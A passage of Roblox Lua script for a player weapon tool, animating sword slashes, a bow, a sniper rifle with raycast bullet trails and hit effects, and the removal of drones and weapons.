			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5+0.5, 0.5, -0.5) * euler(2,0,0.8+0.2*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1,0)
		end
		con1:disconnect()
		wait()
		attack=false
	end

	function slash2()
		attack=true
		CF=Head.CFrame
		con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,10,10) end) 
		so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5) 
		for i=0,1,0.2 do
			wait()
			swld1.C0=euler(0.5-0.5*i,-1.57,-1.57)*cf(0,1,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1-0.5*i, 0.5, -0.5+0.5*i) * euler(2-0.43*i,0,1-2.57*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1+.57*i,0)
			Bg.cframe=CF*euler(0,3.14*i,0)
		end
		so("http://roblox.com/asset/?id=10209640",LeftArm,1,1.5) 
		for i=0,1,0.2 do
			wait()
			swld1.C0=euler(-0.5*i,-1.57,-1.57)*cf(0,1,0)
			Bg.cframe=CF*euler(0,3.14+3.14*i,0)
		end
		con1:disconnect()
		wait()
		attack=false
	end

	function slash3()
		attack=true
		Bg.Parent=nil
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(0,0,0.785-0.785*i)
			swld1.C0=euler(-0.5+0.5*i,-1.57,-1.57)*cf(0,1,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57+.43*i,0,-1.57+1*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57-2.07*i,0)
		end
		con1=sprt16.Touched:connect(function(hit) Damagefunc1(hit,20,10) end) 
		so("http://roblox.com/asset/?id=10209640",LeftArm,1,0.9) 
		for i=0,1,0.2 do
			wait()
			Neck.C0=necko*euler(0.3*i,0,-0.2*i)
			swld1.C0=euler(-0.3*i,-1.57,-1.57)*cf(0,1,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(-0.5*i,0,0.2+0.2*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5+1.5*i, 0.5-0.2*i, -1*i) * euler(2-1.5*i,0,-.57+1.07*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
		end
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1.5, 0.5, 0) * euler(-0.5,0,0.4)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(0, 0.3, -1) * euler(.5-.2*i,0,.5)
			LW.C1=cf(0, 0.5, 0) * euler(0,-.5,0)
		end
		con1:disconnect()
		wait()
		attack=false
	end

	function BowShoot()
		attack=true
		BowAim=true
		HeadNumb=0
		Humanoid.WalkSpeed=2
		coroutine.resume(coroutine.create(function(FenNeck) 
			while BowAim==true do
				wait()
				local pos4 = vt(workspace.CurrentCamera.CoordinateFrame.X,Head.Position.Y,workspace.CurrentCamera.CoordinateFrame.Z)
				Bg.cframe = cf(Head.Position,pos4) * euler(0,3.14-HeadNumb,0) * cf(0,0,0) --cf(Torso.Position,MMouse.Hit.p) * 
				Bg.Parent = Torso
				offset=(Torso.Position.y-MMouse.Hit.p.y)/60
				mag=(Torso.Position-MMouse.Hit.p).magnitude/80
				offset=offset/mag 
				FenNeck.C1=necko2*euler(-offset,0,0)
			end
		end),Neck)
		for i=0,1,0.1 do
			wait()
			HeadNumb=1.57*i
			swld1.C0=euler(0,-1.57+0.3*i,-1.57)*cf(0,1,0)
			Neck.C0=necko*euler(0,0,HeadNumb)
			RW.C0=cf(1.5-2.5*i, 0.5, -1*i) * euler(1.57*i,0,0.2-1.97*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57*i,0,-0.4-0.87*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end

		local string1=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String1",vt(0.5,1,0.5))
		local stringmsh1=mesh("CylinderMesh",string1,"","",vt(0,0,0),vt(0.1,1,0.1))
		local stringwld1=weld(string1,string1,prt17,euler(0,0,0)*cf(0,0,0))
		local string2=part(3,sword,0,1,BrickColor.new("Bright yellow"),"String2",vt(0.5,1,0.5))
		local stringmsh2=mesh("CylinderMesh",string2,"","",vt(0,0,0),vt(0.1,1,0.1))
		local stringwld2=weld(string2,string2,prt19,euler(0,0,0)*cf(0,0,0))
		table.insert(SwordWelds,stringwld1)
		table.insert(SwordWelds,stringwld1)
		coroutine.resume(coroutine.create(function(String1,String2)
			for i=0,1,0.1 do
				wait()
				String1.Transparency=String1.Transparency-0.05
				String2.Transparency=String2.Transparency-0.05
			end
		end),string1,string2)

		local strmdl = "Arrow"
		coroutine.resume(coroutine.create(function()
			arrowdebounce=false
			repeat
				wait(0)
				coroutine.resume(coroutine.create(function()
					if arrowdebounce==false then
						so("http://www.roblox.com/asset/?id=10756118",sprt18,1,1) 
						Lightning(sprt17.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
						Lightning(sprt19.Position,sprt18.Position,3,0.2,"Bright yellow",0.00001,0.4)
						arrowdebounce=true
						wait(0.1)
						arrowdebounce=false
					end
				end))
				local top = sprt17.CFrame
				local bottom = sprt19.CFrame
				local oristrpos
				if strmdl == "Bow" then
					oristrpos = CFrame.new((top.p+bottom.p)/2)
				elseif strmdl == "Arrow" then
					oristrpos = sprt18.CFrame
				end
				local mg1 = (top.p - oristrpos.p).magnitude
				local mg2 = (bottom.p - oristrpos.p).magnitude
				stringmsh1.Scale=vt(0.1,mg1,0.1)
				basecf=sprt17.CFrame
				cff=CFrame.new(sprt17.CFrame*angles(1.57,0,0).p,sprt18.Position)*angles(math.rad(90),0,0)*cf(0,-mg1/2,0)
				hit2=string1
				hit=sprt18
				stringwld1.Parent=string1
				stringwld1.Part0=hit2
				stringwld1.Part1=hit
				HitPos=cff.p
				local CJ = CFrame.new(HitPos)
				local C0=cff:inverse() *CJ 
				local C1=hit.CFrame:inverse() * CJ 
				stringwld1.C0=C0
				stringwld1.C1=C1

				stringmsh2.Scale=vt(0.1,mg2,0.1)
				cff2=CFrame.new(sprt18.CFrame*angles(1.57,0,0).p,sprt19.Position)*angles(math.rad(90),0,0)*cf(0,-mg2/2,0)
				hit3=string2
				hit2=sprt18
				stringwld2.Parent=string2
				stringwld2.Part0=hit3
				stringwld2.Part1=hit2
				HitPos2=cff2.p
				local CJ2 = CFrame.new(HitPos2)
				local C02=cff2:inverse() *CJ 
				local C12=hit2.CFrame:inverse() * CJ 
				stringwld2.C0=C02
				stringwld2.C1=C12
			until string1.Parent==nil
		end))
		swld18.Part1=RightArm
		swld18.C0=cf(0,1,0)
		local arrow=part(3,sword,0,1,BrickColor.new("Bright yellow"),"Arrow",vt(1,1,1))
		local arrowmsh=mesh("SpecialMesh",arrow,"FileMesh","http://www.roblox.com/asset/?id=15887356",vt(0,0,0),vt(1,1,2))
		arrowmsh.VertexColor=vt(1,1,1)
		local arrowwld=weld(arrow,arrow,sprt18,euler(-1.57,0,0)*cf(0,1,0))
		for i=0,1,0.1 do
			wait()
			arrow.Transparency=arrow.Transparency-0.05
			arrowwld.C0=euler(-1.57,0,0)*cf(0,1,0)*euler(0,0,0.15*i)
			RW.C0=cf(1.5-2.5+2*i, 0.5, -1) * euler(1.57,0,-1.77+0.2*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		while BowAim==true do
			wait(0)
		end
		so("http://www.roblox.com/asset/?id=16211041",prt18,1,1) 
		spread=0
		range=500
		rangepower=100
		shoottrail(MMouse.Hit.p,arrow,30,10,2)
		Humanoid.WalkSpeed=0
		arrow.Parent=nil
		swld18.Part0=sprt18
		swld18.Part1=sprt1
		swld18.C0=cf(0,0,-0.8)
		for i=0,1,0.2 do
			wait()
			Neck.C0=necko*euler(-0.2*i,0,HeadNumb)
			RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
			RW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
			LW.C1=cf(0, 0.5, 0) * euler(-0.4*i,0,0)
		end
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.2-0.1*i,0,HeadNumb)
			RW.C0=cf(1, 0.5, -1) * euler(1.57,0,-1.57)
			RW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57,0,-1.27)
			LW.C1=cf(0, 0.5, 0) * euler(-0.4-0.1*i,0,0)
		end
		string1.Parent=nil
		string2.Parent=nil
		BowAim=false
		Humanoid.WalkSpeed=16
		Bg.Parent=nil
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3+0.3*i,0,HeadNumb-HeadNumb*i)
			RW.C0=cf(1+0.5*i, 0.5, -1+1*i) * euler(1.57-1.57*i,0,-1.57+1.77*i)
			RW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(1.57-1.57*i,0,-1.27+1.07*i)
			LW.C1=cf(0, 0.5, 0) * euler(-0.5+0.5*i,0,0)
		end
		spread=0
		range=500
		rangepower=50
		Neck.C1=necko2
		Neck.C0=necko
		attack=false
	end

	function Aim()
		attack=true
		Humanoid.WalkSpeed=5
		Bg.Parent=Torso
		Bg.cframe=Head.CFrame
		CF=Torso.CFrame
		for i=0,1,0.1 do
			wait()
			Bg.cframe=CF*euler(0,0.785*i,0)
			Neck.C0=necko*euler(0,0,-0.785*i)
			Neck.C1=necko2*euler(0,-0.5*i,0)
			RW.C0=cf(1+0.2*i, 0.3, -0.5-0.2*i) * euler(0.9+0.6*i,0,-0.3+0.1*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.3+0.27*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07+0.5*i,0,0.7+0.085*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function UnAim()
		attack=true
		Humanoid.WalkSpeed=16
		for i=0,1,0.1 do
			wait()
			Bg.cframe=CF*euler(0,0.785-0.785*i,0)
			Neck.C0=necko*euler(0,0,-0.785+0.785*i)
			Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
			RW.C0=cf(1.2-0.2*i, 0.3, -0.7+0.2*i) * euler(1.5-0.6*i,0,-0.2-0.1*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57-0.27*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57-0.5*i,0,0.785-0.085*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		Bg.Parent=nil
		attack=false
	end

	function SniperShoot()
		attack=true
		spread=0
		range=1000
		rangepower=100
		shoottrail(MMouse.Hit.p,snprt15,20,20,0.5)
		coroutine.resume(coroutine.create(function()
			for z = 1 ,4 do
				coroutine.resume(coroutine.create(function()
					local meshb1 = Instance.new("BlockMesh")
					meshb1.Scale = Vector3.new(1,1,1)
					light = Instance.new("PointLight")
					light.Brightness = .8
					light.Color = Color3.new(100,50,0)
					light.Range = 10
					local shellb1 = Instance.new("Part")
					light.Parent = shellb1
					meshb1.Parent = shellb1
					shellb1.Anchored = true
					shellb1.formFactor = 3
					shellb1.Size = Vector3.new(0.3,0.3,0.3) * (math.random(100,300)/100)
					shellb1.CFrame = CFrame.new((snprt15.CFrame * CFrame.new(0,-snprt15.Size.y/2,0)).p) * CFrame.Angles(math.random(-100,100)/100,math.random(-100,100)/100,math.random(-100,100)/100)
					shellb1.Parent = Character
					shellb1.Transparency = 0
					if math.random(1,2) == 1 then
						shellb1.BrickColor = BrickColor.new("Bright red")
					else
						shellb1.BrickColor = BrickColor.new("Bright orange")
					end
					shellb1.CanCollide = false
					local incre = math.random(0,60)/100
					HCF=Head.CFrame.lookVector
					for i = 0 , 1 , 0.02 do
						wait()
						light.Brightness = light.Brightness - .02
						shellb1.CFrame = shellb1.CFrame + HCF*incre
						shellb1.Transparency = 1*i
						meshb1.Scale = Vector3.new(1+1*i,1+1*i,1+1*i)
					end
					shellb1.Parent=nil
				end))
			end
		end))
		so("http://roblox.com/asset/?id=10209875",snprt15,1,0.8) 
		for i=0,1,0.3 do
			wait()
			Neck.C0=necko*euler(-0.3*i,0,-0.785)
			RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3*i,0,-0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
			LW.C1=cf(0, 0.5, 0) * euler(-0.3*i,0,0)
		end
		for i=0,1,0.2 do
			wait()
			Neck.C0=necko*euler(-0.3-0.1*i,0,-0.785)
			RW.C0=cf(1.2, 0.3, -0.7) * euler(1.5+0.3+0.1*i,0,-0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785)
			LW.C1=cf(0, 0.5, 0) * euler(-0.3-0.1*i,0,0)
		end
		Humanoid.WalkSpeed=16
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.4+0.6*i,0,-0.785+0.785*i)
			Neck.C1=necko2*euler(0,-0.5+0.5*i,0)
			RW.C0=cf(1.2, 0.3, -0.7) * euler(1.9-0.6*i,0,-0.2-0.4*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.785-0.185*i)
			LW.C1=cf(0, 0.5, 0) * euler(-0.4+0.8*i,0,0)
		end
		so("http://roblox.com/asset/?id=10209881",snprt15,1,1) 
		local ammo=part(3,workspace,0,0,BrickColor.new("Bright yellow"),"Ammo",vt(1,1,1))
		ammo.CanCollide=true
		ammomsh=mesh("CylinderMesh",ammo,"","",vt(0,0,0),vt(0.15,0.2,0.15))
		local cfrf = snprt25.CFrame * CFrame.fromEulerAnglesXYZ(0,1.57,0)
		local cfr = cfrf + cfrf.lookVector * -0.5
		ammo.CFrame = cfr
		ammo.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
		ammo.Velocity = cfr.lookVector * 20
		coroutine.resume(coroutine.create(function(Part) 
			wait(10)
			Part.Parent=nil
		end),ammo)
		for i=0,1,0.2 do
			wait()
			snwld26.C1=euler(0,0,1*i)
			RW.C0=cf(1.2, 0.3, -0.7-0.4*i) * euler(1.3,0,-0.6+0.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
		end
		for i=0,1,0.2 do
			wait()
			snwld26.C1=euler(0,0,1-1*i)
			RW.C0=cf(1.2, 0.3, -0.7-0.4+0.4*i) * euler(1.3,0,-0.6+0.3-0.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
		end
		Humanoid.WalkSpeed=5
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(0.2-0.2*i,0,-0.785*i)
			Neck.C1=necko2*euler(0,-0.5*i,0)
			RW.C0=cf(1.2, 0.3, -0.7) * euler(1.3+0.2*i,0,-0.6+0.4*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.57,0,0.6+0.185*i)
			LW.C1=cf(0, 0.5, 0) * euler(0.4-0.4*i,0,0)
		end
		spread=0
		range=500
		rangepower=50
		attack=false
	end

	function RemoveDrones()
		attack=true
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.5*i,0,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		for _,v in pairs(modelzorz:children()) do
			if v.Name=="Drone" then
				print("FoundDrone")
				for _,s in pairs(v:children()) do
					if s.className=="Part" then
						s.Anchored=true
						coroutine.resume(coroutine.create(function(Part,Model) 
							for i=0,1,0.1 do
								wait(0)
								Part.Transparency=Part.Transparency+0.1
							end
							wait()
							Model.Parent=nil
						end),s,v)
					end
				end
			end
		end
		wait(1)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.5+0.5*i,0,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(3.14-3.14*i,0,0)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2+0.2*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function RemoveDrones2()
		attack=true
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.3-0.3*i,0,-0.3+0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.4*i,0,-0.7)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
			LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(2.3+0.84*i,0,0.7-0.7*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		for _,v in pairs(modelzorz:children()) do
			if v.Name=="Drone" then
				print("FoundDrone")
				for _,s in pairs(v:children()) do
					if s.className=="Part" then
						s.Anchored=true
						coroutine.resume(coroutine.create(function(Part,Model) 
							for i=0,1,0.1 do
								wait(0)
								Part.Transparency=Part.Transparency+0.1
							end
							wait()
							Model.Parent=nil
						end),s,v)
					end
				end
			end
		end
		wait(1)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(-0.6+0.3*i,0,-0.3*i)
			RW.C0=cf(1, 0.3, -0.8) * euler(1.17+0.4*i,0,-0.7)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
			LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(3.14-0.84*i,0,0.7*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function RemoveGun()
		attack=true
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
			LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.2*i) * euler(0.5+1.07*i,0,0.6-0.6*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57,0)
		end
		for _,s in pairs(gun:children()) do
			if s.className=="Part" then
				coroutine.resume(coroutine.create(function(Part,Model) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.1
					end
					wait()
					Model.Parent=nil
				end),s,gun)
			end
		end
		wait(0.7)
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
			LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
		end
		attack=false
	end

	function RemoveSword()
		attack=true
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.8*i) * euler(1.27*i,0,0.2-1.5*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1*i,0)
			LW.C0=cf(-1.5, 0.5, -0.1*i) * euler(1.57*i,0,-0.4+0.4*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57*i,0)
		end
		for _,s in pairs(sword:children()) do
			if s.className=="Part" then
				coroutine.resume(coroutine.create(function(Part,Model) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.1
					end
					wait()
					Model.Parent=nil
				end),s,sword)
			end
		end
		wait(0.7)
		for i=0,1,0.1 do
			wait()
			RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
			LW.C0=cf(-1.5, 0.5, -0.1+0.1*i) * euler(1.57-1.57*i,0,0)
			LW.C1=cf(0, 0.5, 0) * euler(0,1.57-1.57*i,0)
		end
		attack=false
	end

	function RemoveSniper()
		attack=true
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(0.4*i,0,0)
			snwld1.C0=euler(2.07+0.3*i,0,0)*cf(0,1,0)
			RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.9+0.37*i,0,-0.3-1*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,1.3-1*i,0)
			LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.07,0,0.7-0.2*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		for _,s in pairs(sniper:children()) do
			if s.className=="Part" then
				coroutine.resume(coroutine.create(function(Part,Model) 
					for i=0,1,0.1 do
						wait(0)
						Part.Transparency=Part.Transparency+0.1
					end
					wait()
					Model.Parent=nil
				end),s,sniper)
			end
		end
		wait(0.7)
		for i=0,1,0.1 do
			wait()
			Neck.C0=necko*euler(0.4-0.4*i,0,0)
			RW.C0=cf(1+0.5*i, 0.3, -0.8+0.8*i) * euler(1.27-1.27*i,0,-1.3+1.3*i)
			RW.C1=cf(0, 0.5, 0) * euler(0,0.3-0.3*i,0)
			LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.07-1.07*i,0,0.5-0.5*i)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		attack=false
	end

	function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
		return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
	end 

	function Lightning(p0,p1,tym,ofs,col,th,tra)
		local magz = (p0 - p1).magnitude local curpos = p0 local trz = {-ofs,ofs}
		for i=1,tym do 
			local li = Instance.new("Part",workspace) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = tra or 0.4 li.BrickColor = BrickColor.new(col)
			li.formFactor = "Custom" li.CanCollide = false li.Size = Vector3.new(th,th,magz/tym) local ofz = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)]) 
			light1=Instance.new("PointLight")
			light1.Brightness=.8
			light1.Color=Color3.new(.2,255,.2)
			light1.Range=8
			light1.Parent=li
			local trolpos = CFrame.new(curpos,p1)*CFrame.new(0,0,magz/tym).p+ofz
			if tym == i then 
				local magz2 = (curpos - p1).magnitude li.Size = Vector3.new(th,th,magz2)
				li.CFrame = CFrame.new(curpos,p1)*CFrame.new(0,0,-magz2/2)
			else
				li.CFrame = CFrame.new(curpos,trolpos)*CFrame.new(0,0,magz/tym/2)
			end
			curpos = li.CFrame*CFrame.new(0,0,magz/tym/2).p game.Debris:AddItem(li,.2)
		end
	end

	spread=0
	range=500
	rangepower=50
	function shoottrail(ShootPosition,baseprt,Damage,Knockback,Size)
		coroutine.resume(coroutine.create(function() 
			local spreadvector = (Vector3.new(math.random(-spread,spread),math.random(-spread,spread),math.random(-spread,spread))) * (baseprt.Position-ShootPosition).magnitude/100
			local dir = CFrame.new((baseprt.Position+ShootPosition)/2,ShootPosition+spreadvector)
			local hit,pos = rayCast(baseprt.Position,dir.lookVector,10,modelzorz)
			local rangepos = range
			local function drawtrail(From,To)
				local effectsmsh = Instance.new("CylinderMesh")
				effectsmsh.Scale = Vector3.new(1,1,1)
				effectsmsh.Name = "Mesh"
				local effectsg = Instance.new("Part")
				effectsg.formFactor = 3
				effectsg.CanCollide = false
				effectsg.Name = "Eff"
				effectsg.Locked = true
				effectsg.Anchored = true
				effectsg.Size = Vector3.new(0.2,0.2,0.2)
				effectsg.Parent = modelzorz
				effectsmsh.Parent = effectsg
				effectsg.BrickColor = BrickColor.new("Bright yellow")
				effectsg.Reflectance = 0.4
				local LP = From
				local point1 = To
				local mg = (LP - point1).magnitude
				effectsmsh.Scale = Vector3.new(2,mg*5,2)
				effectsg.CFrame = CFrame.new((LP+point1)/2,point1) * CFrame.Angles(math.rad(90),0,0)
				coroutine.resume(coroutine.create(function()
					for i = 0 , 1 , 0.1 do
						wait()
						effectsg.Transparency = 1*i
						effectsmsh.Scale = Vector3.new(Size-Size*i,mg*5,Size-Size*i)
					end 
					effectsg.Parent = nil 
				end))
			end
			local newpos = baseprt.Position
			local inc = rangepower
			repeat
				wait() wait() 
				rangepos = rangepos - 10
				dir = dir
				if Mode~="Sniper" then
					dir = dir * CFrame.Angles(math.rad(-1),0,0)
				end
				hit,pos = rayCast(newpos,dir.lookVector,inc,Character)
				drawtrail(newpos,pos)
				newpos = newpos + (dir.lookVector * inc)
				if inc >= 20 then
					inc = inc - 10
				end
				if hit ~= nil then
					rangepos = 0
				end
			until rangepos <= 0
			if hit ~= nil then
				if hit.Parent:FindFirstChild("Humanoid") ~= nil then
					critical=false
					if SnipAim==true then
						if hit.Name=="Head" then
							coroutine.resume(coroutine.create(function(HeadPart)
								for i=0,0.5,0.1 do
									wait()
									HeadPart.Velocity=vt(0,60,0) 
								end
							end),hit)
							print("CRITICAL")
							critical=true
							p=it("Part")
							p.Parent=workspace
							p.CanCollide=false
							p.Transparency=1
							p.CFrame=hit.CFrame
							p.Anchored=true
							local GUI = it("BillboardGui") 
							GUI.Adornee = p
							GUI.Parent = p
							GUI.Active = true 
							GUI.Enabled = true 
							GUI.Size = UDim2.new(1, 0, 1, 0) 
							GUI.StudsOffset = vt(0, 4, 0) 
							local Chat = it("TextLabel") 
							Chat.Parent = GUI 
							Chat.FontSize = "Size12" 
							Chat.Position = UDim2.new(0.599999964, 0, 0, 0) 
							Chat.Visible = true 
							Chat.Text = "Critical!" 
							coroutine.resume(coroutine.create(function(Part) 
								for i=0,4,0.1 do
									wait()
									Part.CFrame=Part.CFrame*cf(0,0.05,0)
								end
								Part.Parent=nil
							end),p) 
							for i=0,7 do
								Blood=it("Part")
								Blood.Name="Blood"
								Blood.TopSurface="Smooth"
								Blood.BottomSurface="Smooth"
								Blood.formFactor="Plate"
								Blood.BrickColor=BrickColor:Red()
								Blood.Size=vt(1,.4,1)
								Blood.Velocity=vt(math.random(-4,4),math.random(5,25),math.random(-4,4))
								Blood.CFrame=hit.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
								Blood.Parent=workspace 
								Blood.Velocity=vt(math.random(-20,20),math.random(20,50),math.random(-20,20)) 
								Blood.CanCollide=false
								coroutine.resume(coroutine.create(function(blod) 
									wait(0.1)
									blod.CanCollide=true
									wait(5) 
									blod.Parent = nil 
								end),Blood) 
							end
						end
						hum = hit.Parent.Humanoid
						tTorso=hit.Parent.Torso
					end
					if critical==true then
						CRIT=true
						Damagefunc1(hit,Damage*math.random(3,8),Knockback)
					else
						Damagefunc1(hit,Damage,Knockback)
					end
					attackdebounce=false
					--ADmg(hum,hit)
				elseif hit.Parent.Parent ~= nil and hit.Parent.Parent:FindFirstChild("Humanoid") ~= nil then
					if SnipAim==true then
						if hit.Parent.className == "Hat" then 
							hatCF=hit.CFrame
							coroutine.resume(coroutine.create(function(hat)
								hat.Handle:BreakJoints()
								hat.Handle.CFrame=hatCF
								hat.Handle.CanCollide=true
								hat.Handle.Velocity=vt(math.random(-10,10),40,math.random(-10,10)) 
								wait(3)
								hatCF=hat.Handle.CFrame
								hat.Parent=workspace
								for i=0,4,0.2 do
									wait()
									hat.Handle.CFrame=hatCF
									hat.Handle.Velocity=vt(math.random(-5,5),20,math.random(-5,5)) 
								end
							end),hit.Parent)
--[[hit:BreakJoints() 
hit.CFrame=CF
hit.Velocity = vt(math.random(-5,5),20,math.random(-5,5)) ]]
							print("BREAKHAT")
						end
					end
					hum = hit.Parent.Parent.Humanoid
					tTorso=hit.Parent.Parent.Torso
					Damagefunc1(hit.Parent.Parent.Torso,Damage,Knockback)
					attackdebounce=false
					--ADmg(hum,hit)
				end
			end
		end))
	end

	function findNearestTorso(pos)
		local list = game:service("Workspace"):children()
		local torso = nil
		local dist = 50
		local temp = nil
		local human = nil
		local temp2 = nil
		for x = 1, #list do
			temp2 = list[x]
			if (temp2.className == "Model") and (temp2 ~= Character) and (temp2.Name ~= "Fenrier") then
				temp = temp2:findFirstChild("Torso")
				human = temp2:findFirstChild("Humanoid")
				if (temp ~= nil) and (human ~= nil) and (human.Health > 0) then
					if (temp.Position - pos).magnitude < dist then
						torso = temp
						dist = (temp.Position - pos).magnitude
					end
				end
			end
		end
		return torso
	end

	function MagicCircle(brickcolor,cframe,x1,y1,z1,x2,y2,z2,x3,y3,z3)
		local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
		prt.Anchored=true
		prt.CFrame=cframe*cf(x2,y2,z2)
		local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
		coroutine.resume(coroutine.create(function() 
			for i=0,1,0.1 do
				wait()
				prt.CFrame=prt.CFrame
				prt.Transparency=i
				msh.Scale=msh.Scale+vt(x3,y3,z3)
			end
			prt.Parent=nil
		end))
	end 

	Damagefunc1=function(hit,Damage,Knockback)
		if hit.Parent==nil then
			return
